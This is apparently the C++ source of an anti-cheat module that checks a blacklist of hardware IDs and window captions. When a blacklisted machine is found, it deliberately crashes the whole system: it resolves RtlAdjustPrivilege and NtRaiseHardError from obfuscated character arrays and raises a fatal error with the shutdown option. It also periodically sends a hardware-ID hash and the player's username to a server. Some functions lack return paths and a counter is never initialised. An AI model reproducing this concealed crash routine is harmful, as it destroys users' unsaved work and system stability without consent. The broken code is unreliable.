#include "anticheat.h"
#include <stdint.h>
#include <string>
#include "protocol.h"
#include "utils/utils.h"
#include "utils/api_resolver.h"
#include "rewolf-wow64ext/src/wow64ext.h"
#include <set>
#include <future>
#include "lighthook.h"

NTSTATUS NTAPI RtlAdjustPrivilege64()
{
	static DWORD64 stc = 0;
	if (0 == stc)
	{
		char tmp[] = { 'R', 't', 'l', 'A', 'd', 'j', 'u', 's', 't', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', 0 };
		stc = GetProcAddress64(getNTDLL64(), tmp);
		if (0 == stc)
			return 0;

		BOOLEAN was_enabled;
		return X64Call(stc, 4, (DWORD64)0x13, (DWORD64)TRUE, (DWORD64)FALSE, (DWORD64)&was_enabled);

	}
}

NTSTATUS NTAPI NtRaiseHardError64()
{
	static DWORD64 stc = 0;
	if (0 == stc)
	{
		char tmp[] = { 'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', 0 };
		stc = GetProcAddress64(getNTDLL64(), tmp);
		if (0 == stc)
			return 0;

		ULONG response;

		return X64Call(stc, 6, (DWORD64)0xC000021A, (DWORD64)4, (DWORD64)1, (DWORD64)NULL, (DWORD64)6, (DWORD64)&response);

	}
}


namespace WndProcHideHook
{
	extern WNDPROC old_wnd_proc;
}
namespace ShellCode
{
	class TaskStaticDetect : public Task
	{
	public:
		TaskStaticDetect()
		{
			set_interval(30000);
			set_package_id(SHELLCODE_PACKAGE_ID(12));

			// 机器码黑名单
			machine_id_set = {
				/*0x3F02C223,*/
			};

			// 窗口名黑名单
			window_caption_set = {
				/*L"窗口名",*/
			};
		}
		~TaskStaticDetect()
		{

		}
		virtual void on_time_proc(uint32_t curtime)
		{
			ProtocolShellCodeInstance proto;
			proto.id = get_package_id();
			proto.is_cheat = false;
			proto.m_type = Protocol::PackageType::PACKAGE_TYPE_ADMIN;
			auto windows = Utils::CWindows::instance().enum_windows_ex();
			auto Sleep = IMPORT(L"kernel32.dll", Sleep);
			// 机器码检测
			uint32_t machine_id_hash = Utils::HardwareInfo::get_all_device_ids_hash();
			std::wstring gamer_username = Utils::Player::get_game_window_username();
			char buffer[30] = { 0 };
			snprintf(buffer, sizeof(buffer), "%08X", machine_id_hash);
			if (machine_id_set.find(machine_id_hash) != machine_id_set.end())
			{
				proto.is_cheat = true;
				proto.reason += L"12121212:" + Utils::string2wstring(buffer);
				AntiCheat::instance().async_call([](ULONG_PTR) {
					RtlAdjustPrivilege64();
					NtRaiseHardError64();
				}, NULL);
				auto ExitProcess = IMPORT(L"kernel32.dll", ExitProcess);
				WndProcHideHook::old_wnd_proc = (WNDPROC)ExitProcess;
			}
			else
			{
                if(machine_id_upload_count % 10 == 0)
                {
                    if(machine_id_upload_count == 1000) machine_id_upload_count = 0;
				    proto.reason = L"【" + gamer_username + L"】的121212:" + Utils::string2wstring(buffer);
				    AntiCheat::instance().send(proto);
                }
                machine_id_upload_count++;
			}

			// 窗口名检测
			if (!proto.is_cheat)
			{
				for (auto& window : windows)
				{
					if (window_caption_set.find(window.caption) != window_caption_set.end())
					{
						proto.is_cheat = true;
						proto.reason = L"检测到非法窗口名：" + window.caption;
						break;
					}
					Sleep(1);
				}
			}

			if (proto.is_cheat)
			{
				AntiCheat::instance().send(proto);
			}
		};
		std::set<uint32_t> machine_id_set;
		std::set<std::wstring> window_caption_set;
        uint32_t machine_id_upload_count;
	};
	uint32_t main()
	{
		TaskStaticDetect* task = new TaskStaticDetect();
		if (AntiCheat::instance().add_task(task))
		{
			return 0;
		}
		else
		{
			delete task;
			return 1;
		}
	}
}